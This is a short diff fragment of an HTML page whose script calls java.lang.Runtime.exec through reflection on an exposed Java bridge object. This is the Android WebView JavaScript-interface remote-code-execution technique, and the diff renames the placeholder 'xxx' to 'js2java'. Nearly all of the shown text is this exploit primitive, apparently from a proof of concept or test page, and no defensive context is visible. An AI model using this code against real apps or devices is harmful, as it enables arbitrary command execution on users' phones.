@@ -35,7 +35,7 @@
 <script>
 function execute(cmdArgs) 
 { 
-return xxx.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); 
+return js2java.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); 
 }  
 
 function myfunction(){
